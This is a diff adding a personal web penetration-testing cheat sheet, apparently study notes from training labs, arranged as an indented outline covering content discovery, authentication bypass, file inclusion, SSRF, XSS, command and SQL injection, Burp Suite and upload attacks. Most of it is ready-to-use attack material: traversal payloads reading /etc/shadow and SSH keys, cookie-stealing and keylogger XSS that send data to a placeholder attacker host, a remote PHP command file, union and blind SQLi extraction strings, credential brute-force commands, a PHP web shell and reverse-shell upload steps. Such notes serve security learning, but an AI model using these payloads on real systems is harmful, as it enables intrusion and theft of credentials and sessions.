@@ -1,0 +1,824 @@
+
+
+Check Page Source
+    Search
+        <!--
+
+
+
+Developer Tools
+    Inspector
+    Debugger
+    Network
+
+
+
+Content Discovery
+
+    Manual
+
+        robots.txt
+        favicon.ico
+            curl https://example.false/favicon.ico | md5sum
+                https://wiki.owasp.org/index.php/OWASP_favicon_database
+        sitemap.xml
+        HTTP Headers
+            curl https://example.false -v
+        Framework Stack
+            Administration portal
+        Wappalyzer
+            CVE
+        Google Dorking
+            site:example.false
+            inurl:admin
+            filetype:pdf
+            intitle:admin
+        Wayback Machine
+        GitHub
+        S3 Buckets
+            http(s)://{name}.s3.amazonaws.com
+
+
+    Automated
+
+        Wordlists
+            ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u https://example.false/FUZZ
+            gobuster dir --url https://example.false/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
+
+
+
+Subdomain Enumeration
+
+    Brute Force
+        dnsrecon -t brt -d example.false
+
+    OSINT
+        SSL/TLS Certificates
+        Google Dork
+            -site:www.example.false site:*.example.false
+        Automation
+            ./sublist3r.py -d example.false
+
+    Virtual Host
+        ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.example.false" -u https://example.false
+        ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.example.false" -u https://example.false -fs {size}
+
+
+
+Authentication Bypass
+
+    Username Enumeration
+        ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u https://example.false/customers/signup -mr "username already exists"
+
+    Brute Force
+        ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u https://example.false/customers/login -fc 200
+
+    Logic Flaw
+            curl 'https://example.false/customers/reset?email=john%40example.false' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=john'
+
+        Create an account on example.false
+            curl 'https://example.false/customers/reset?email=john%40example.false' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=john&email=attacker@example.false'
+
+
+
+Cookie Tampering
+
+    Plain Text
+        curl -H "Cookie: logged_in=true; admin=true" https://example.false/admin
+
+    Hashed
+        md5, sha-256, sha-512, sha1, etc
+
+    Encoded
+        session=eyJpZCI6MSwiYWRtaW4iOmZhbHNlfQ==
+            This string base64 decoded has the value of {"id":1,"admin": false}
+
+
+
+Insecure Direct Object Reference (IDOR)
+
+    Address bar AND Network
+
+        Plain Text
+            https://example.false/profile?user_id=42
+        Encoded
+        Hashed
+            https://crackstation.net
+        Unpredictable IDs
+            Create two accounts and swap the Id numbers between them
+
+
+
+File Inclusion
+
+    Path Traversal
+
+        http://example.false/get.php?file=../../../../etc/passwd
+        http://example.false/get.php?file=../../../../windows/win.ini
+            Common OS files
+                /etc/issue
+                /etc/profile
+                /proc/version
+                /etc/passwd
+                /etc/shadow
+                /root/.bash_history
+                /var/log/dmessage
+                /var/mail/root
+                /root/.ssh/id_rsa
+                /var/log/apache2/access.log
+                C:\boot.ini
+
+
+    Local File Inclusion (LFI)
+
+        http://example.false/get.php?file=../../../../etc/passwd
+        http://example.false/get.php?file=....//....//....//....//....//etc/passwd
+        http://example.false/get.php?file=directory/../../../../../etc/passwd%00
+        http://example.false/get.php?file=../../../../etc/passwd0x00
+        http://example.false/get.php?file=../../../../etc/passwd/.
+
+
+    Remote File Inclusion (RFI)
+
+        Remote Command Execution (RCE)
+            http://example.false/index.php?lang=http://ATT.ACK.ER.IP/cmd.txt
+                cmd.txt
+                    <?PHP
+                            echo shell_exec('hostname');
+                    ?>
+
+
+
+Server-Side Request Forgery (SSRF)
+
+    Examples
+
+        EXPECTED https://example.false/form?service=https://api.example.false/store
+            TRICK https://example.false/form?service=../user
+
+        EXPECTED https://example.false/stock?server=api&id=42
+            TRICK https://example.false/stock?server=api.example.false/api/user&x=&id=42
+                EQUALS https://api.example.false/api/user?x=.example.false/api/stock/item?id=42
+
+        EXPECTED https://example.false/stock/item?id=42
+            TRICK https://example.false/stock/item?url=http://ATT.ACK.ER.IP
+
+    Finding an SSRF
+
+        In the address bar
+            When a full URL is used in a parameter
+            A partial URL such as just the hostname
+            Or perhaps only the path of the URL
+
+        A hidden field in a form
+            Full URL
+            Path
+
+    Defeating Common SSRF Defenses
+
+        Allow List
+            LISTED https://example.false
+                TRICK https://example.false.hacker.io
+
+        Deny list
+            Alternative localhost (or 127.0.0.1) references
+                0
+                0.0.0.0
+                0000
+                127.1
+                127.*.*.*
+                2130706433
+                017700000001
+                DNS record which resolves to the IP Address 127.0.0.1 such as 127.0.0.1.nip.io
+            Cloud
+                169.254.169.254 which contains metadata for the deployed cloud server
+                    Registering a subdomain on another domain with a DNS record to 169.254.169.254
+
+        Open Redirect
+            Stringent rules which only allowed URLs beginning with https://example.false
+                https://example.false/link?url=http://ATT.ACK.ER.IP
+
+
+
+Cross-site Scripting
+
+    Payloads
+
+        Proof Of Concept
+                <script>alert('XSS')</script>
+
+                "><script>alert('XSS')</script>
+
+                </textarea><script>alert('XSS')</script>
+
+                ';alert('XSS');//
+
+                <sscriptcript>alert('XSS')</sscriptcript>
+
+                /images/any.jpg" onload="alert('XSS');
+
+            Polyglots (bypass CSP)
+                jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
+
+        Session Stealing
+            nc -nlvp 80
+                <script>fetch('http://ATT.ACK.ER.IP/steal?cookie=' + btoa(document.cookie))</script>
+
+        Key Logger
+            <script>document.onkeypress = function(e) {fetch('http://ATT.ACK.ER.IP//log?key=' + btoa(e.key))}</script>
+
+        Business Logic
+            <script>example.changeEmail('attacker@hack.box')</script>
+
+
+    Types
+
+        Reflected XSS
+            A website where if you enter incorrect input
+                https://example.false/?error=Invalid%20Input%20Detected
+
+            The application doesn't check the contents of the error parameter
+                ENCODED
+                    https://example.false/?error=%3Cscript%20src%3D%22http%3A%2F%2FATT.ACK.ER.IP%2Fevil.js%22%3E%3C%2Fscript%3E
+                EQUALS
+                    https://example.false/?error= " <script src="http://ATT.ACK.ER.IP/evil.js"></script> "
+
+        Stored XSS
+            Modify request from Network to bypass any client-side validation
+                In the database if no server-side validation
+
+        DOM Based XSS
+            Searching /window\.location\.+/ references in JavaScript files
+            Unsafe JavaScript method eval()
+
+
+
+Command Injection, or Remote Code Execution (RCE)
+
+    Applications that use user input to populate system commands with data
+
+        Shell operators
+            ;
+            &
+            &&
+                Will combine two (or more) system commands
+
+
+    Useful payloads
+
+        Linux
+            whoami, ls, ping, sleep, nc
+
+        Windows
+            whoami, dir, ping, timeout
+
+
+    Verbose
+        Direct feedback
+
+
+    Blind
+        No direct output
+
+            Detecting Blind Command Injection
+
+                Payloads that will cause some time delay
+                    sleep
+                    ping
+                        In relation to how many pings you have specified
+
+                Forcing some output
+                    Redirection operators
+                        >
+
+                curl
+                    Delivering data to and from an application in your payload
+                        TRICK curl http%3A%2F%2Fexample.false%2Findex.php%3Fsearch%3Dany%3B%20whoami
+                            EQUALS http://example.false/index.php?search=any; whoami
+
+    Input sanitisation
+
+        Bypassing Filters
+            Use the hexadecimal value
+
+
+
+SQLi (SQL Injection)
+
+    Database
+
+        Table
+                Each column, better referred to as a field has a unique name per table
+                Rows or records are what contains the individual lines of data
+
+            UNION
+                        Must retrieve the same number of columns in each SELECT statement
+                        Columns have to be of a similar data type and order has to be the same
+
+                SELECT name,address,city,postcode FROM customers
+                    UNION SELECT company,address,city,postcode FROM suppliers;
+
+        Using the LIKE clause
+            SELECT * FROM users WHERE username LIKE 'a%';
+                ... admin ...
+            SELECT * FROM users WHERE username LIKE '%n';
+                ... john ...
+            SELECT * FROM users WHERE username LIKE '%mi%';
+                ... admin ...
+
+
+    https://example.false/blog?id=1
+            SELECT * FROM blog WHERE id=1 and private=0 LIMIT 1;
+
+        Let's pretend article id 2 is locked as private
+            https://example.false/blog?id=2;--
+                SELECT * FROM blog WHERE id=2;-- AND private=0 LIMIT 1;
+                    SELECT * FROM blog WHERE id=2;--
+
+
+    In-Band SQL Injection
+        Being able to extract data from the database to the same page
+
+
+    Error-Based SQL Injection
+        Trying certain characters until an error message is produced
+            Useful for easily obtaining information about the database structure
+
+
+    Union-Based SQL Injection
+        This method is the most common way of extracting large amounts of data
+            Error message until reaching the correct number of columns
+                1 UNION SELECT 1
+                1 UNION SELECT 1,2
+                1 UNION SELECT 1,2,3
+                    We need the first query to produce no results
+                        0 UNION SELECT 1,2,3
+                        0 UNION SELECT 1,2,database()
+                        0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
+                        0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
+                        0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
+
+
+    Blind SQLi
+        The error messages have been disabled
+            One of the most straightforward Blind SQL Injection techniques is when bypassing authentication methods
+                We just need to create a database query that replies with a true
+                    In the password field
+                        ' OR 1=1;--
+                            SELECT * FROM users WHERE username='' AND password='' OR 1=1;
+
+
+    Boolean Based
+        select * from users where username = '%username%' LIMIT 1;
+            The browser body contains the contents of {"taken":true}
+            It's possible to enumerate a whole database structure and contents
+                admin123' UNION SELECT 1;--
+                admin123' UNION SELECT 1,2,3;--
+                    admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
+                    admin123' UNION SELECT 1,2,3 WHERE database() LIKE 's%';--
+                    admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'sa%';--
+                    admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'sb%';--
+                    admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'sc%';--
+                    ...
+                    admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'sqli_three';--
+                    admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' AND table_name like 'a%';--
+                    ...
+                    admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' AND table_name = 'users';--
+                    admin123' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_schema = 'sqli_three' AND table_name = 'users' AND column_name LIKE 'a%';--
+
+                admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'a%';--
+                ...
+                admin123' UNION SELECT 1,2,3 FROM users WHERE username = 'admin' AND password LIKE 'a%';--
+
+
+    Time Based
+        Very similar to Boolean Based, but your indicator is the time the query takes to complete
+            When trying to establish the number of columns in a table
+                admin123' UNION SELECT SLEEP(5);--
+                admin123' UNION SELECT SLEEP(5),2;--
+
+            referrer=admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password LIKE '4961';--
+
+
+    Out-of-Band SQLi
+        Hacker --> Website --> Database --> Hacker
+
+
+
+Burp Community Basics
+
+    Proxy to intercept and modify requests/responses
+    Repeater to capture, modify, then resend the same request numerous times
+    Intruder to spray an endpoint with requests for bruteforce attacks or to fuzz endpoints
+    Decoder to decode captured information, or encode a payload prior to sending it to the target
+    Comparer to compare two pieces of data at either word or byte level
+    Sequencer when assessing the randomness of tokens such as session cookie values or other supposedly random generated data
+
+
+    Connecting through the Proxy (FoxyProxy)
+
+        The Burp Proxy works by opening a Web interface on 127.0.0.1:8080 by default
+            https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard
+
+                HTTPS
+                    With the proxy activated head to http://burp/cert
+                        This will download a file called cacert.der
+                        Save it somewhere on your machine
+                    Next, type "about:preferences" into your Firefox search bar
+                    Search for "certificates" and find the option "View Certificates"
+                    We can register a new certificate for Portswigger by pressing "Import"
+                    In the menu that pops up, select "Trust this CA to identify websites"
+                        We should now be free to visit any TLS enabled sites
+
+        Target tab, right-clicking our target from our list on the left, then "Add To Scope"
+            Burp will then ask us whether we want to stop logging anything which isn't in scope
+
+        The proxy will still be intercepting everything
+            To turn this off, in the Proxy Options sub-tab
+                Select "And URL Is in target scope" from the Intercept Client Requests section
+
+
+    Issue Definitions
+
+        Whilst we don't have access to the Burp Suite vulnerability scanner in Burp Community
+            We do still have access to a list of all the vulnerabilities it looks for
+
+
+    Repeater
+
+        With a request captured in the proxy
+            We can send it to repeater by right-clicking on the request and choosing "Send to Repeater"
+
+            /about/2'
+                Adding a single apostrophe is usually enough to cause the server to error when a simple SQLi is present
+                    An extremely useful error message which the server should absolutely not be sending us
+
+                        /about/0 UNION ALL SELECT column_name,null,null,null,null FROM information_schema.columns WHERE table_name="people"
+                            This creates a union query and selects our target then four null columns (to avoid the query erroring out)
+                            Notice that we also changed the ID that we are selecting from 2 to 0.
+                                By setting the ID to an invalid number
+                                    We ensure that we don't retrieve anything with the original (legitimate) query
+                                    This means that the first row will be our desired response from the injected query
+                        ...
+
+
+    Intruder
+
+        Burp Suite's in-built fuzzing tool
+        Burp Community is heavily rate-limited
+            This means that many hackers choose to use other tools for fuzzing and bruteforcing
+
+
+        Positions
+            Positions are placeholders delimited by section signs
+
+            Types of attack
+
+                Sniper
+                    requests = numberOfWords * numberOfPositions
+                        This quality makes Sniper very good for single-position attacks
+                            Bruteforce if we know the username or fuzzing for API endpoints
+
+                Battering Ram
+                    Puts the same payload in every position rather than in each position in turn
+
+                Pitchfork
+                    Uses one payload set per position and iterates through them all at once
+                        Like having numerous Snipers running simultaneously
+
+                Cluster Bomb
+                    Iterates through each payload set individually
+                        Making sure that every possible combination of payloads is tested
+
+
+        Credential stuffing attack
+            As we have a list of known usernames, each associated with a password, we can avoid a straight bruteforce
+
+        Insecure Direct Object References
+            Fuzzing
+
+        Session HttpOnly cookie set + Cross-Site Request Forgery token included in the form as a hidden field
+            Macros
+
+
+    Decoder
+        Work with encoded text
+
+    Comparer
+        Compare sets of text
+
+    Sequencer
+        Analyse the randomness of captured tokens, measure the entropy
+
+    Extensions
+        Invoked in descending order
+
+
+
+OWASP
+
+    2021
+
+        1.  Broken Access Control
+        2.  Cryptographic Failures
+        3.  Injection
+        4.  Insecure Design
+        5.  Security Misconfiguration
+        6.  Vulnerable and Outdated Components
+        7.  Identification and Authentication Failures
+        8.  Software and Data Integrity Failures
+        9.  Security Logging & Monitoring Failures
+        10. Server-Side Request Forgery (SSRF)
+
+
+    Cryptographic Failures example
+
+        Flat-file database
+
+            file webapp.db
+            sqlite3 webapp.db
+                .tables
+                PRAGMA table_info(users);
+                SELECT * FROM users;
+                .quit
+
+
+    Command Injection examples
+
+        When a Web app makes a call to a function that interacts with the server's console directly
+            The possibilities for the attacker from here are endless
+
+                PHP example
+                    passthru($command)
+
+            Bash allows you to run commands within commands, enclose them in $(your_command_here)
+
+                uname -a --> print system information
+                ifconfig --> configure a network interface
+                ip a --> show / manipulate routing, network devices, interfaces and tunnels
+                id --> print real and effective user and group IDs
+                whoami --> print effective user name
+                ps -ef --> report a snapshot of the current processes
+
+                    List non-root/non-service/non-daemon users
+                        All users whose gid is greater than or equals 1000
+                                gawk --> pattern scanning and processing language
+                            $(awk -F: '($3>=1000)&&($1!="nobody"){print $1}' /etc/passwd)
+
+                    What is the user's shell set as?
+                        Get the uid
+                            $(id)
+                        Check for uid
+                            $(cat /etc/passwd | grep <uid>)
+
+                    Find OS version
+                        $(find /etc -name *release* 2>/dev/null)
+
+
+    Insecure Design example
+
+        Password Resets
+        ...
+
+
+    Security Misconfiguration
+
+        Security Misconfigurations are distinct from the other Top 10 vulnerabilities
+        Because they occur when security could have been appropriately configured but was not
+
+                Poorly configured permissions on cloud services, like S3 buckets
+                Having unnecessary features enabled, like services, pages, accounts or privileges
+                Default accounts with unchanged passwords
+                Error messages that are overly detailed and allow attackers to find out more about the system
+                Not using HTTP security headers
+
+            Debugging Interfaces example
+
+                Werkzeug Debugger
+                    For Python-based Web applications
+                        Provides an interface for Web servers to execute the Python code
+                        Includes a debug console that can be accessed via URL on /console
+                        As soon as something in the code results in an exception or error, a console is opened
+                            This is basically Remote Code Execution by design
+
+                                http://VIC.TI.ME.IP/console
+                                    import os; print(os.popen("ls -l").read())
+
+
+    Vulnerable and Outdated Components
+
+        Program with a well-known vulnerability
+            Exploit-DB
+
+
+    Identification and Authentication Failures
+
+        Brute force attacks
+        Use of weak credentials
+        Weak Session Cookies
+
+
+    Integrity
+
+        Software Integrity Failures
+            Third-party libraries
+                Subresource Integrity (SRI)
+                    srihash.org
+                        <script
+                            src="https://code.jquery.com/jquery-3.6.1.min.js"
+                            integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ="
+                            crossorigin="anonymous"
+                        ></script>
+
+        Data Integrity Failures
+            Cookie
+                JSON Web Tokens (JWT)
+                    Each of the 3 parts of the token is simply plaintext encoded with base64
+                        Header
+                            Metadata indicating this is a JWT and the signing algorithm
+                        Payload
+                            Contains key-value pairs
+                        Signature
+                            Contains binary data
+                            Involves the use of a secret key held by the server only
+                            If you change the payload, you won't be able to generate the matching signature
+                    JWT and the None Algorithm
+                        Modify the header section so that the alg header would contain the value none
+                        Remove the signature part
+
+
+    Server-Side Request Forgery
+
+        user@attackbox$ nc -lnvp 80
+            Enumerate internal networks, including IP addresses and ports
+            Abuse trust relationships between servers and gain access to otherwise restricted services
+            Interact with some non-HTTP services to get Remote Code Execution (RCE)
+
+
+    XSS
+
+        There are three major types of XSS attacks
+
+            DOM (Special) commonly uses the <script></script> tag
+
+            Persistent (Server-side) run when the server loads the page containing it, commonly found on blog posts
+                Header
+                    The True-Client-IP header is similar to the X-Forwarded-For header
+                    Both tell the server or proxy what the IP of the client is
+                    Due to there being no sanitation in the header we are able to perform an XSS attack
+                        True-Client-IP: <iframe src="javascript:alert(`xss`)">
+
+            Reflected (Client-side) commonly found when the server doesn't sanitise search data
+
+
+
+Upload Vulnerabilities
+
+    Enumeration is key
+        Scanning with a directory bruteforcer such as Gobuster may reveal where files are being uploaded
+
+
+    Overwriting Existing Files
+
+
+    Remote Code Execution
+
+        Web Shell
+            Upload webshell.php
+                <?php
+                    echo system($_GET["cmd"]);
+                ?>
+            example.false/webshell.php?cmd=id;whoami;ls
+
+
+        Reverse Shell
+            1
+                Pentest Monkey reverse shell comes by default on Kali Linux
+                    ls -al /usr/share/webshells
+                But can also be downloaded
+                    https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+                Edit by adding your IP address
+                Upload the PHP file on http://example.false/{name-of-directory}
+            2
+                https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/raft-medium-directories.txt
+                    gobuster dir -u http://example.false -w raft-medium-directories.txt
+            3
+                nc -lnvp 1234
+            4
+                http://example.false/{name-of-directory}/{name-of-shell}
+            5
+                Enter the command of your choice under nc
+
+
+    Filtering
+
+        Server-side
+            File Extension
+                Variety of other more rarely used extensions
+                    .php .phtml .php3, .php4, .php5, .php7, .phps, .php-s, .pht .phar
+                Trying to get an idea of what the filter will accept or reject
+                    shell.jpg.php
+            File Type
+                Content-Type
+                    MIME (Multipurpose Internet Mail Extension)
+                Magic Number
+                    String of hex digits at the very beginning of the file content which identify the content
+                    https://en.wikipedia.org/wiki/List_of_file_signatures
+                        file        Determine file type
+                            Open up the reverse shell script and add four random characters on the first line
+                        hexeditor   Full screen curses Hex editor
+                            Replace the random characters with a file signature
+                            file <name>
+            File Name
+            File Content
+            File Length
+
+
+        Client-side
+
+            Turn off Javascript in your browser
+            Intercept and modify the incoming page
+            Intercept and modify the file upload
+                Burp
+                    Right click on the intercepted request
+                    Scroll down to "Do Intercept"
+                    Select "Response to this request"
+            Send the file directly to the upload point
+                curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path-to-file>" <site>
+
+
+    Methodology
+
+        Enumerating
+
+            Wappalyzer
+                Languages and frameworks
+
+            Manually
+                Burp
+                    Intercepting response headers such as server or x-powered-by
+
+
+        Vectors of attack
+
+            An upload page for example
+                Attempt a completely innocent file upload
+
+                    Client-side filters
+                        Disable or modify scripts
+
+
+                    Gobuster
+                            -x      Files with specific extensions
+                                        -x php,txt,html
+                                        Useful if the server is changing the name of uploaded files
+
+                                | tee       Read from standard input and write to standard output and files
+
+                        If the innocent file can be accessed from a downloads folder
+                            Attempt a malicious file upload
+
+
+                    Server-side filters
+                        Error messages are extremely useful
+
+                            If you can upload_testing_image_with.invalidfileextension
+                                    Blacklist to filter out executable files
+                                If this upload fails
+                                    Whitelist
+
+                            Try re-uploading your originally accepted innocent file
+                                But change the magic number to be something that could be filtered
+                                    If the upload fails
+                                        Magic number based filter
+
+                            Try re-upload your innocent file
+                                But intercept with Burp and change the MIME type to something that could fail
+                                    If the upload fails
+                                        MIME type based filter
+
+                            Upload a small file
+                                Then bigger files
+                                    Until you hit the filter
+                                        File length based filter
+
+
+                CTF
+
+                    gobuster dir -u http://example.false -w wordlist.txt
+
+                    nikto
+                        Scan Web server for known Vulnerabilities
+
+                    while read line; do echo $line; done < source.txt
+
+                    grep -R .
+                        view-source
+
+                    python -c "print('me')"
+                        pentestmonkey
+                            Reverse Shell Cheat Sheet
+
+                    sudo bash
+
+
